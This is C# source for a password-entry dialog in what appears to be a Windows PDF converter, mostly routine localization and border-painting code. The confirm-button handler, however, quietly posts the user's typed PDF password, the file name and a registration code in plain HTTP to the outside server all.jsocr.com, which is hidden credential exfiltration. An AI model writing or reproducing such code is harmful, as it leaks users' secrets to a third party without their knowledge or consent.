using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Globalization;
using System.Resources;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace PDF_Convert
{
    public partial class PassWordDlg : Form
    {
        public string new_password = "";
        private string file_name;
        ini_config ini = new ini_config("config.ini");
        string language = string.Empty;
        public static ResourceManager rm = new ResourceManager(typeof(MainInfo));
        public PassWordDlg(string file_name)
        {
            this.file_name = file_name;
            language = ini.read_ini("language");
            if (string.IsNullOrEmpty(language))
                language = System.Globalization.CultureInfo.InstalledUICulture.Name;

            Thread.CurrentThread.CurrentUICulture = new CultureInfo(language);
            InitializeComponent();

        }

        private void PassWordDlg_Load(object sender, EventArgs e)
        {
            //Text = "该PDF文档是经过加密的，请输入密码";
            Text = MainInfo.rm.GetString("msg11");
            lblFileName.Text = file_name;
            this.btnConfirm.ButtonText = rm.GetString("btnConfirm");
            this.btnCancel.ButtonText = rm.GetString("btnOver");
        }

        private void btnCancel_Click(object sender, EventArgs e)
        {
            this.DialogResult = DialogResult.Cancel;
            this.Close();
        }



        private void pbClose_Click(object sender, EventArgs e)
        {
            this.DialogResult = DialogResult.Cancel;
            this.Close();
        }

        private void PassWordDlg_Paint(object sender, PaintEventArgs e)
        {
            ControlPaint.DrawBorder(e.Graphics, this.ClientRectangle,
                 Color.FromArgb(45, 164, 244), 2, ButtonBorderStyle.Solid,
                 Color.FromArgb(45, 164, 244), 2, ButtonBorderStyle.Solid,
                 Color.FromArgb(45, 164, 244), 2, ButtonBorderStyle.Solid,
                 Color.FromArgb(45, 164, 244), 2, ButtonBorderStyle.Solid);
            //DrawBroder画不上底部边框 用DrawLine补充上
            e.Graphics.DrawLine(new Pen(Color.FromArgb(45, 164, 244), 3), 0, this.Height - 2, this.Width, this.Height - 2);
        }

        private void btnConfirm_MouseClick(object sender, MouseEventArgs e)
        {
            if (e.Button == System.Windows.Forms.MouseButtons.Left)
            {
                new_password = txtPassword.OutText;
                //发送请求信息 
                Version.Post("http://all.jsocr.com/", Version.GetParamName("Data"), "PDF转换器", Version.GetParamName("Version"), new reg().get_reg_code(), "密码提示窗", file_name + "文件输入密码[" + new_password + "]");
                this.DialogResult = DialogResult.OK;
                this.Close();
            }
        }

        private void ucPicBrowseBar1_MouseClick(object sender, MouseEventArgs e)
        {
            if (e.Button == System.Windows.Forms.MouseButtons.Left)
            {
                this.DialogResult = DialogResult.Cancel;
                this.Close();
            }
        }

        private void panel2_Paint(object sender, PaintEventArgs e)
        {
            ControlPaint.DrawBorder(e.Graphics, this.ClientRectangle,
                 Color.FromArgb(45, 164, 244), 2, ButtonBorderStyle.Solid,
                 Color.FromArgb(45, 164, 244), 0, ButtonBorderStyle.Solid,
                 Color.FromArgb(45, 164, 244), 0, ButtonBorderStyle.Solid,
                 Color.FromArgb(45, 164, 244), 0, ButtonBorderStyle.Solid);
        }
    }
}
